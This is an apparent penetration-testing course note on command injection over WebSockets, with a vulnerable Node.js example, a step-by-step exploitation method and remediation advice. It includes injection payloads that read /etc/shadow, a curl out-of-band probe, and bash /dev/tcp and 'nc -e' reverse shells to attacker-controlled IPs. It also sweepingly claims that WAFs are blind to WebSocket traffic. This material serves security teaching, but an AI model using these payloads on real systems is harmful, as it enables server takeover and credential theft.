---
tags: [vapt, websockets, rce, critical, deepdive]
difficulty: advanced
module: "29 - WebSockets Security"
topic: "29.07 WebSocket Command Injection"
---

# 29.07 — WebSocket Command Injection

## 1. Introduction: The Shell Beyond the WAF
**WebSocket Command Injection** is a critical vulnerability that occurs when an application receives untrusted data via a WebSocket connection and subsequently passes that data, unsanitized, into a system-level execution function (such as `system()`, `exec()`, `popen()`, or Node.js `child_process.exec()`).

The resulting impact is **Remote Code Execution (RCE)**, granting the attacker complete, unmitigated control over the underlying server infrastructure.

While OS Command Injection is a well-understood vulnerability in traditional HTTP applications (see Module 07), delivering the payload via WebSockets drastically alters the threat landscape. 
Because WebSockets operate outside the standard stateless HTTP request/response cycle, the data transmission happens as raw binary framing over an established TCP socket. **Traditional Web Application Firewalls (WAFs) and Intrusion Prevention Systems (IPS) are completely blind to this traffic.** A WAF that would normally block the string `; cat /etc/passwd` in an HTTP POST body will completely ignore the exact same string if it is nestled inside a continuous WebSocket stream. This makes WebSocket Command Injection the ultimate evasion technique for achieving RCE in heavily monitored enterprise environments.

## 2. The Vulnerable Architecture
This vulnerability is exceptionally prevalent in specific types of web applications:
- **DevOps Dashboards:** Tools that monitor server health, deploy code, or stream live log files.
- **IoT Device Interfaces:** Home routers, smart cameras, and NAS devices that use WebSockets to run diagnostic tools (like `ping` or `traceroute`) or change system configurations.
- **Data Export Utilities:** Features that generate massive reports, PDFs, or archive files, often relying on underlying system binaries (like `wkhtmltopdf` or `tar`) invoked via the shell.

The core flaw occurs when developers use insecure APIs to interact with the host operating system.

```javascript
// Extremely Vulnerable Node.js Implementation (IoT Router Diagnostic Tool)
const { exec } = require('child_process');

ws.on('message', function incoming(message) {
    let data = JSON.parse(message);
    
    if (data.command === 'ping_host') {
        // THE FATAL FLAW: Concatenating untrusted socket data into a shell command
        let shellCommand = "ping -c 4 " + data.target_ip;
        
        // Exec passes the entire string to /bin/sh for interpretation
        exec(shellCommand, (error, stdout, stderr) => {
            if (error) {
                ws.send(JSON.stringify({ status: "error", output: stderr }));
            } else {
                ws.send(JSON.stringify({ status: "success", output: stdout }));
            }
        });
    }
});
```

## 3. Extensive ASCII Diagram: The Anatomy of RCE
```text
================================================================================
                    OS COMMAND INJECTION OVER WEBSOCKETS
================================================================================

[ The Normal Operation (Legitimate Diagnostic Check) ]
Browser sends: `{"command": "ping_host", "target_ip": "8.8.8.8"}`
Backend executes: `/bin/sh -c "ping -c 4 8.8.8.8"`
Backend streams output back over WebSocket: "64 bytes from 8.8.8.8..."

[ The Attacker's Strategy (Intercept & Modify) ]
The attacker uses Burp Repeater to manipulate the JSON payload. They use the 
semicolon (;) to terminate the ping command and inject a malicious command.

    [ OUTBOUND WEBSOCKET FRAME ]
    {
       "command": "ping_host",
       "target_ip": "8.8.8.8; cat /etc/shadow"
    }

[ The WAF Evasion ]
The Cloudflare WAF sees a persistent, encrypted WebSocket tunnel. It does not 
attempt to parse the binary framing or the JSON within it. The payload bypasses 
the perimeter defense entirely.

[ The Backend Execution (The Node.js Server) ]
The Node.js server blindly concatenates the string and passes it to the shell.
`/bin/sh -c "ping -c 4 8.8.8.8; cat /etc/shadow"`

The Operating System executes the instructions sequentially:
1. It executes `ping -c 4 8.8.8.8`.
2. Because of the semicolon (;), the shell treats the next string as a new command.
3. It executes `cat /etc/shadow`.

[ The Exfiltration ]
The backend Node.js server captures the `stdout` of BOTH commands. It bundles 
the output into a JSON frame and pushes it back down the WebSocket tunnel.
The attacker receives the password hashes directly in their Burp Repeater window.
================================================================================
```

## 4. Methodological Discovery and Exploitation

**Step 1: Target Identification**
- Map the application's functionality. Look for any feature that feels like it interacts with the underlying operating system (e.g., file uploads/conversions, network diagnostics, server status monitors, or video transcoding).
- Identify the WebSocket frames that trigger these actions using Burp Suite's `WebSockets history` tab.

**Step 2: Basic Metacharacter Fuzzing**
- Send the target WebSocket frame to Burp Repeater.
- Identify the parameters that might be passed to the shell (e.g., `target_ip`, `filename`, `url`).
- Fuzz these parameters using standard command separators:
  - Semicolon: `;`
  - Pipe: `|`
  - Ampersands: `&&` or `&`
  - Command Substitution: `$(whoami)` or `` `whoami` ``
- *Example Probe:* `{"target_ip": "127.0.0.1; id"}`
- Check the WebSocket response. Does the output of the `id` command (e.g., `uid=0(root) gid=0(root)`) appear in the JSON response? If yes, you have confirmed **In-Band Command Injection**.

**Step 3: Blind Command Injection Probing**
Often, developers do not return the output of the command back to the socket. They simply return `{"status": "processing"}`. To confirm injection in this scenario, you must use Blind techniques.
- **Time-Based Inference:** 
  - Inject a sleep command: `{"target_ip": "127.0.0.1; sleep 10"}`.
  - Does the server take exactly 10 seconds to send the `{"status": "processing"}` response back over the socket? If so, the system is executing your command.
- **Out-of-Band (OOB) Inference:**
  - Inject a command that forces the server to make a network request to an external server you control (e.g., Burp Collaborator).
  - Probe: `{"target_ip": "127.0.0.1; curl http://your-collaborator-id.net"}`
  - Check your Collaborator client. If you receive an HTTP request or a DNS lookup from the target server's IP address, you have proven Blind RCE.

## 5. Escalation: From Injection to Reverse Shell
Once RCE is confirmed, the ultimate goal is to establish a persistent interactive shell. Because WebSockets bypass WAFs, you rarely need to heavily obfuscate your reverse shell payloads.

1. **Set up a Listener:** On your attacker machine, start a Netcat listener: `nc -lvnp 4444`.
2. **Craft the Payload:** The standard Bash reverse shell is highly effective on Linux targets.
   `bash -c 'bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1'`
3. **Inject the Payload:** Package it into the WebSocket JSON:
   `{"target_ip": "127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'"}`
4. **Execute:** Send the frame via Burp Repeater. Your Netcat listener will catch the incoming connection, granting you an interactive shell as the web server user (e.g., `www-data` or `node`).

## 6. Real-World Case Study
A security researcher was auditing a popular open-source Home Automation dashboard. The dashboard allowed users to view real-time logs from various smart home devices using WebSockets. To filter logs, the frontend sent a message: `{"action": "tail_logs", "device": "thermostat", "lines": "50"}`.

The backend Python server parsed this JSON and executed a shell command using `os.system()`:
`os.system(f"tail -n {message['lines']} /var/log/{message['device']}.log")`

The researcher intercepted the WebSocket frame and manipulated the `device` parameter:
`{"action": "tail_logs", "device": "thermostat.log; nc -e /bin/sh 192.168.1.100 4444 #", "lines": "50"}`

The resulting command executed on the backend was:
`tail -n 50 /var/log/thermostat.log; nc -e /bin/sh 192.168.1.100 4444 #.log`
The `#` symbol commented out the remainder of the command. The server immediately spawned a reverse shell to the researcher's machine, granting root access to the central home automation hub.

## 7. How to Fix It (Developer Remediation)

Preventing Command Injection requires strict adherence to secure coding principles.

**1. The Ultimate Defense: Avoid Shell Execution Entirely**
The absolute best way to prevent Command Injection is to simply not use system shells. If you need to ping an IP, use a native Node.js or Python network library. If you need to read a file, use native filesystem APIs (`fs.readFile`). Using native libraries completely eliminates the concept of "shell metacharacters."

**2. The Fallback Defense: Safe Execution APIs (No Shell Wrapping)**
If you absolutely *must* invoke an external binary, do not use functions that pass the entire command string to `/bin/sh` or `cmd.exe` for interpretation. 
Instead, use APIs that execute the binary directly and accept arguments as an array of strings. This prevents the operating system from evaluating characters like `;` or `|` as command separators; they are simply treated as literal arguments passed to the binary.

*Insecure (Node.js):*
`require('child_process').exec('ping -c 4 ' + userInput)`

*Secure (Node.js):*
```javascript
const { execFile } = require('child_process');

// execFile DOES NOT invoke a shell. It runs the binary directly.
// The arguments are passed as an array. Metacharacters are treated as literal strings.
execFile('ping', ['-c', '4', userInput], (error, stdout, stderr) => {
    ws.send(JSON.stringify({ output: stdout }));
});
```

**3. Strict Input Validation**
If the input must be an IP address, validate it against a strict regular expression before processing. Reject the WebSocket frame immediately if the input contains unexpected characters.

## Related Notes
- [[07.01 What is OS Command Injection?]]
- [[07.03 Out-of-Band (OOB) Command Injection]]
- [[29.04 WebSocket Message Manipulation]]
